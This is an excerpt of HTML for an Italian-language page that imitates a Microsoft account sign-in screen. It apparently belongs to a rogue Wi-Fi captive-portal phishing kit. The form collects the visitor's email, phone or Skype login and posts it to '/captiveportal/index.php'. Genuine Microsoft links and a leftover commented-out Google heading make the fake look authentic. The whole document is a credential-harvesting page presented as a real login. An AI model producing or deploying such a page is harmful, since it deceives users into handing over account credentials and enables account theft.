...
<html lang="en" dir="ltr">
    <head>
        ...
        <title>Accesso all'account</title>
            ...
            <div class="login-container">
                ...
                <div class='login-content' id='login-form'>
                    ...
                    <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" id='email-form-step'>
                        <h1 class='g-h1'>Accedi</h1>
                        <!--<h2 class='g-h2'>Use your Google Account</h2>-->
                        <div class='login-content'>
                            <input name="email" id='email-input' type="text" class='g-input' placeholder="Posta elettronica, telefono o Skype" required>
                            ...
                            <div class='login-priv'>
                                <p class='p'>Se non si ha un account, <a href="https://signup.live.com/signup">fare clic qui per crearne uno.</a></p>
                                <p class='p'><a href="https://passwordreset.microsoftonline.com/">Problemi di accesso all'account?</a></p>
                            ...
                            <div class='login-nav'>
                                ...
                                <button class='gbtn-primary' type="submit">Avanti</button>
                            </div>
                        </div>
                    </form>
                </div>
